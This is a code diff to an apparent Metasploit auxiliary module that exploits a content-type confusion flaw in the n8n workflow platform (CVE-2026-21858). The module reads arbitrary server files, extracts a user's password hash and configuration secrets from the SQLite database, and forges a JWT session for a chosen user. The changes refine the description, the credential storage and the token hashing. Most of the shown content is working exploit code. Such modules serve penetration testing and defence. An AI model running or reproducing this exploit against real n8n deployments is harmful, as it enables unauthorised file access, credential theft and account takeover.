@@ -13,14 +13,19 @@ class MetasploitModule < Msf::Auxiliary
       update_info(
         info,
         'Name' => 'n8n arbitrary file read',
-        'Description' => 'This module exploits CVE-2026-21858, a critical unauthenticated remote code execution vulnerability in n8n workflow automation platform versions 1.65.0 through 1.120.x. The vulnerability, dubbed "Ni8mare", is a content-type confusion flaw in webhook request handling that allows attackers to achieve arbitrary file read.',
+        'Description' => %q{
+          This module uses the Ni8mare content-type confusion flaw, CVE-2026-21858, to read files
+          from n8n through a file upload workflow created with valid application credentials.
+          It can extract a SQLite user record and configuration secrets to derive a JWT for the
+          selected user. It does not execute an operating system payload or verify token acceptance.
+        },
         'Author' => [
           'dor attias', # research
           'msutovsky-r7' # module
         ],
         'Actions' => [
           ['READ_FILE', { 'Description' => 'Read an arbitrary file from the target' }],
-          ['EXTRACT_SESSION', { 'Description' => 'Create an admin JWT session key by reading out secrets' }]
+          ['EXTRACT_SESSION', { 'Description' => 'Derive a JWT for a selected user from extracted secrets' }]
         ],
         'DefaultAction' => 'EXTRACT_SESSION',
         'License' => MSF_LICENSE,
@@ -32,7 +37,7 @@ class MetasploitModule < Msf::Auxiliary
       )
     )
     register_options([
-      OptString.new('TARGET_EMAIL', [false, 'A target user for spoofed session, when EXTRACT_ADMIN_SESSION action is set'], conditions: ['ACTION', '==', 'EXTRACT_SESSION']),
+      OptString.new('TARGET_EMAIL', [false, 'A target user for spoofed session, when EXTRACT_SESSION action is set'], conditions: ['ACTION', '==', 'EXTRACT_SESSION']),
       OptString.new('N8N_CONFIG_DIR', [false, 'Absolute path to n8n config directory', '/home/node/.n8n/'], conditions: ['ACTION', '==', 'EXTRACT_SESSION']),
       OptString.new('TARGET_FILENAME', [false, 'A target filename, when READ_FILE action is set'], conditions: ['ACTION', '==', 'READ_FILE']),
       OptString.new('USERNAME', [true, 'Username of n8n (email address)']),
@@ -334,19 +339,29 @@ class MetasploitModule < Msf::Auxiliary
 
       print_good("Database saved to: #{db_loot_name}")
 
-      db = SQLite3::Database.new(db_loot_name)
-
-      user_id = db.execute(%(select id from user where email='#{target_email}')).dig(0, 0)
-      password_hash = db.execute(%(select password from user where email='#{target_email}')).dig(0, 0)
+      begin
+        user_id, password_hash = SQLite3::Database.open(db_loot_name) do |db|
+          db.get_first_row('SELECT id, password FROM user WHERE email = ?', [target_email])
+        end
+      rescue SQLite3::Exception => e
+        elog('Failed to read user credentials from the extracted n8n database', error: e)
+        fail_with(Failure::UnexpectedReply, 'Failed to read user credentials from the extracted n8n database.')
+      end
 
       fail_with(Failure::NotFound, "Could not found #{target_email} in database") unless user_id && password_hash
 
       print_good("Extracted user ID: #{user_id}")
       print_good("Extracted password hash: #{password_hash}")
 
-      store_valid_credential(
-        user: target_email,
-        private: password_hash
+      # This is an extracted hash, not a password validated by a login attempt.
+      create_credential(
+        origin_type: :import,
+        filename: db_loot_name,
+        workspace_id: myworkspace_id,
+        username: target_email,
+        private_data: password_hash,
+        private_type: :nonreplayable_hash,
+        jtr_format: Metasploit::Framework::Hashes.identify_hash(password_hash)
       )
 
       config_content = read_file("#{datastore['N8N_CONFIG_DIR']}/config")
@@ -364,7 +379,9 @@ class MetasploitModule < Msf::Auxiliary
       encryption_key = (0...encryption_key.length).step(2).map { |i| encryption_key[i] }
       encryption_key = encryption_key.join('')
 
-      jwt_payload = %({"id":"#{user_id}","hash":"#{Base64.urlsafe_encode64(Digest::SHA256.digest("#{target_email}:#{password_hash}"))[0..9]}"})
+      # AuthService.hash uses standard Base64; only the JWT envelope uses Base64url.
+      user_hash = Base64.strict_encode64(Digest::SHA256.digest("#{target_email}:#{password_hash}"))[0, 10]
+      jwt_payload = { id: user_id, hash: user_hash }.to_json
 
       jwt_ticket = Msf::Exploit::Remote::HTTP::JWT.encode(jwt_payload.to_s, OpenSSL::Digest::SHA256.hexdigest(encryption_key))
 
